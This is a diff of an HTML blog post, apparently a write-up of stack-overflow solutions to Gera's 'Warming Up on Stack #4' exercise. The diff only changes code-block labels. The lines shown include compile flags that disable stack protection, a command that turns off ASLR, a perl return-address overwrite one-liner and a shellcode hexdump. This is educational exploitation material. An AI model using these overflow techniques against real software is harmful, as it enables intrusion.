@@ -70,7 +70,7 @@ int main() {
 </ul>
 <p>Unlike earlier programs, where Solution #1 suggested overflowing the character array to overwrite <code>cookie</code> with desired value, <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack4.html">stack4.c</a> coud not be exploited in that manner. This is beacuse the <code>cookie</code> has been initialized with 0x000a0d00 and if we inject this string, the newline character (0x0a) will cause the <code>gets</code> internal read to stop processing further characters, thereby breaking our exploit. As such we won't be using this technqiue but rather use alternate methods.</p>
 <p>Here's a brief description of the test system:</p>
-<pre><code class="bash"># cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
+<pre><code class="console"># cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
 DISTRIB_DESCRIPTION=*Ubuntu 10.04.2 LTS*
 Linux 2.6.38 i686 GNU/Linux
 gcc (Ubuntu 4.4.3-4ubuntu5) 4.4.3
@@ -84,7 +84,7 @@ flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat 
 <p>Here's the GCC commandline to prepare
 <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack4.html">stack4.c</a>
 for this solution:</p>
-<pre><code class="bash"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack4 stack4.c
+<pre><code class="console"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack4 stack4.c
 stack4.c: In function ‘main’:
 stack4.c:9: warning: incompatible implicit declaration of built-in function ‘printf’
 stack4.c:9: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 2 has type ‘char (*)[80]’
@@ -122,7 +122,7 @@ and find out the location of the <code>printf</code> function which displays the
 </code></pre>
 
 <p>The address turns out to be 0x8048479. Let's try exploiting:</p>
-<pre><code class="bash"># perl -e 'print &quot;A&quot;x88 . &quot;\x79\x84\x04\x08&quot;' | ./stack4
+<pre><code class="console"># perl -e 'print &quot;A&quot;x88 . &quot;\x79\x84\x04\x08&quot;' | ./stack4
 buf: bfee4144 cookie: bfee4194
 you win!
 Segmentation fault
@@ -130,7 +130,7 @@ Segmentation fault
 
 <h2>Solution #2: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode and overwrite EIP with its address</h2>
 <p>Let's first recompile <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack4.html">stack4.c</a> and request GCC to mark program stack as executable. Additionally, we also need to turn ASLR off so that we can have a static return address to overwrite EIP with:</p>
-<pre><code class="bash"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack4 stack4.c 2&gt;/dev/null ; readelf -l stack4 | grep GNU_STACK
+<pre><code class="console"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack4 stack4.c 2&gt;/dev/null ; readelf -l stack4 | grep GNU_STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 #
 # echo 0 &gt;/proc/sys/kernel/randomize_va_space ; cat /proc/sys/kernel/randomize_va_space
@@ -138,7 +138,7 @@ Segmentation fault
 </code></pre>
 
 <p>Let's go ahead with exploitation. The Null-free, NOP-prefixed <code>printf(you win!)</code> shellcode we used to exploit <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a> in the <a href="https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html">Gera's Warming Up on Stack #1 - Solutions</a> post could be reused here:</p>
-<pre><code class="bash"># ./stack4
+<pre><code class="console"># ./stack4
 buf: bffff4c4 cookie: bffff514
 #
 # ./stack4
@@ -154,7 +154,7 @@ you win!#
 
 <h2>Solution #3: Inject a NOP-prefixed printf(you win!) shellcode through an environment var overwrite EIP with its address</h2>
 <p>Lets get straight to the exploitation:</p>
-<pre><code class="bash"># echo $WINCODE | hexdump -C
+<pre><code class="console"># echo $WINCODE | hexdump -C
 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
 00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
 00000020  20 77 69 6e 21 20 0d 0a                           | win! ..|
